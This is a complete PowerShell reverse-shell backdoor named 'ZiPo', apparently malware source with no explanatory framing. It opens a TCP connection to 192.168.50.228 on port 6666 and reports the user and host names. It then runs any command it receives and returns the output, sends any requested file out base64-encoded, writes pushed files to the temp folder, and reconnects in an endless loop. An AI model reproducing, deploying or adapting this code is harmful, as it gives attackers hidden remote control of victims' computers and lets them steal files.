function Connect-ZiPo {
    $srv = "192.168.50.228"
    $port = 6666
    $logFile = "$env:APPDATA\zipo.log"

    function Write-Log($msg) {
        $timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
        Add-Content -Path $logFile -Value "[$timestamp] $msg"
    }

    function Upload-File($path) {
        if (Test-Path $path) {
            $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($path))
            return "[UPLOAD]::$(Split-Path $path -Leaf)::`n$b64"
        } else {
            return "[ERROR]::File not found: $path"
        }
    }

    function Download-File($filename, $b64) {
        $out = "$env:TEMP\$filename"
        [IO.File]::WriteAllBytes($out, [Convert]::FromBase64String($b64))
        return "[DOWNLOADED] $out"
    }

    while ($true) {
        try {
            $tcp = [Net.Sockets.TcpClient]::new($srv, $port)
            $stream = $tcp.GetStream()
            [byte[]]$buffer = 0..65535 | % { 0 }

            # Приветствие
            $msg = "`n[+] ZiPo Connected :: $env:USERNAME@$env:COMPUTERNAME`n"
            $bytes = [Text.Encoding]::ASCII.GetBytes($msg)
            $stream.Write($bytes, 0, $bytes.Length)

            while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
                $cmd = ([Text.Encoding]::ASCII).GetString($buffer, 0, $i).Trim()
                Write-Log "CMD: $cmd"

                # Upload handler
                if ($cmd.StartsWith("!upload")) {
                    $path = $cmd.Substring(7).Trim()
                    $response = Upload-File $path
                }
                # Download handler
                elseif ($cmd.StartsWith("!download")) {
                    $parts = $cmd.Split("::")
                    if ($parts.Length -eq 3) {
                        $response = Download-File $parts[1].Trim() $parts[2].Trim()
                    } else {
                        $response = "[ERROR] Invalid download format"
                    }
                }
                else {
                    $block = [ScriptBlock]::Create($cmd)
                    $response = & $block 2>&1 | Out-String
                }

                $response += "`nPS " + (Get-Location) + "> "
                $outBytes = [Text.Encoding]::ASCII.GetBytes($response)
                $stream.Write($outBytes, 0, $outBytes.Length)
                $stream.Flush()
            }

            $stream.Close()
            $tcp.Close()
        }
        catch {
            Start-Sleep -Seconds 5
        }
    }
}

Connect-ZiPo
